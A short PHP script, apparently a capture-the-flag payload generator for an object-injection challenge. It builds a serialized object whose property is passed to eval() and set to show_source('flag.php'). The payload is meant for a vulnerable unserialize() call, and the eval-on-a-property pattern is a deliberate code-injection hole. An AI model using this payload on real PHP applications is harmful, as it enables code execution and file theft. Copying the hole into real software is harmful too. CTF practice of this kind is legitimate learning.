<?php
class a{
    var $act;
    function action(){
        eval($this->act);
    }
}
$a=new a();
$a->act="show_source('flag.php');";
$a->action();
echo serialize($a);
?>